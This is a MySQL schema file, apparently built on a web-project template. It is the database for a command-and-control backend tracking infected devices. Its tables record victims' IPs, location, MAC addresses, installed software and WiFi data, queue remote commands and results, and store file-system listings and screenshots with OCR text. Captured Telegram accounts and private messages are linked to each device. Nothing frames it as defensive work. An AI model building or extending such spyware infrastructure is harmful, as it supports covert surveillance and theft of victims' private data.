-- MySQL Schema
-- @author <a href="https://github.com/liyupi">程序员鱼皮</a>
-- @from <a href="https://yupi.icu">编程导航知识星球</a>

-- C2 Device
create table if not exists c2_device
(
    id           bigint auto_increment primary key,
    uuid         varchar(64)                        null,
    internal_ip   varchar(64)                        null,
    external_ip   varchar(64)                        null,
    country       varchar(64)                        null,
    region        varchar(64)                        null,
    city          varchar(64)                        null,
    isp           varchar(128)                       null,
    mac_address   varchar(64)                        null,
    host_name     varchar(128)                       null,
    os           varchar(128)                       null,
    software_list longtext                           null,
    wifi_data     longtext                           null,
    heartbeat_interval int                           default 60000,
    is_monitor_on tinyint      default 0             null,
    current_tg_id varchar(64)                        null,
    data_status   varchar(32)                        null,
    last_seen     datetime                           null,
    create_time   datetime     default CURRENT_TIMESTAMP not null,
    update_time   datetime     default CURRENT_TIMESTAMP not null,
    is_delete     tinyint      default 0             not null
);

-- C2 Task
create table if not exists c2_task
(
    id           bigint auto_increment primary key,
    task_id       varchar(64)                        not null,
    device_uuid  varchar(64)                        null,
    command      varchar(128)                       not null,
    params       text                               null,
    status       varchar(32)                        default 'pending' not null,
    result       longtext                           null,
    create_time   datetime     default CURRENT_TIMESTAMP not null,
    update_time   datetime     default CURRENT_TIMESTAMP not null,
    is_delete     tinyint      default 0             not null
);

-- C2 WiFi
create table if not exists c2_wifi
(
    id             bigint auto_increment primary key,
    device_id      bigint                             not null,
    ssid           varchar(128)                       null,
    bssid          varchar(64)                        null,
    signal_strength varchar(32)                        null,
    authentication varchar(64)                        null,
    create_time     datetime     default CURRENT_TIMESTAMP not null,
    is_delete       tinyint      default 0             not null
);

-- C2 Software
create table if not exists c2_software
(
    id             bigint auto_increment primary key,
    device_id      bigint                             not null,
    name           varchar(256)                       null,
    version        varchar(128)                       null,
    install_date    varchar(64)                        null,
    create_time     datetime     default CURRENT_TIMESTAMP not null,
    is_delete       tinyint      default 0             not null
);

-- C2 File System Node
create table if not exists c2_file_system_node
(
    id            bigint auto_increment primary key,
    device_id     bigint                             not null,
    parent_path   varchar(512)                       null,
    path          varchar(512)                       null,
    name          varchar(256)                       null,
    is_directory  tinyint      default 0             null,
    size          bigint                             null,
    md5           varchar(64)                        null,
    is_recent     tinyint      default 0             null,
    last_modified datetime                           null,
    create_time   datetime     default CURRENT_TIMESTAMP not null,
    is_delete     tinyint      default 0             not null
);

-- C2 Screenshot
create table if not exists c2_screenshot
(
    id             bigint auto_increment primary key,
    device_id      bigint                             null,
    device_uuid    varchar(64)                        not null,
    task_id         varchar(64)                        null,
    url            varchar(512)                       null,
    ocr_result     text                               null,
    create_time     datetime     default CURRENT_TIMESTAMP not null,
    is_delete       tinyint      default 0             not null
);

-- TG Account
create table if not exists tg_account
(
    id           bigint auto_increment primary key,
    tgId         varchar(64)                        null,
    username     varchar(128)                       null,
    phone        varchar(32)                        null,
    firstName    varchar(128)                       null,
    lastName     varchar(128)                       null,
    isBot        tinyint                            default 0,
    isPremium    tinyint                            default 0,
    device_uuid   varchar(64)                        null,
    systemInfo   text                               null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- TG Message
create table if not exists tg_message
(
    id           bigint auto_increment primary key,
    accountId    bigint                             not null,
    msgId        bigint                             null,
    chatId       varchar(64)                        null,
    senderId     varchar(64)                        null,
    content      text                               null,
    msgType      varchar(32)                        null,
    mediaPath    varchar(256)                       null,
    msgDate      datetime                           null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- User Table (t_user)
create table if not exists t_user
(
    id           bigint auto_increment primary key,
    userAccount  varchar(256)                           not null,
    userPassword varchar(512)                           not null,
    unionId      varchar(256)                           null,
    mpOpenId     varchar(256)                           null,
    userName     varchar(256)                           null,
    userAvatar   varchar(1024)                          null,
    userProfile  varchar(512)                           null,
    userRole     varchar(256) default 'user'            not null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0                 not null
);

-- Post Table
create table if not exists post
(
    id           bigint auto_increment primary key,
    title        varchar(512)                           null,
    content      text                                   null,
    tags         varchar(1024)                          null,
    thumbNum     int          default 0                 not null,
    favourNum    int          default 0                 not null,
    userId       bigint                                 not null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0                 not null
);
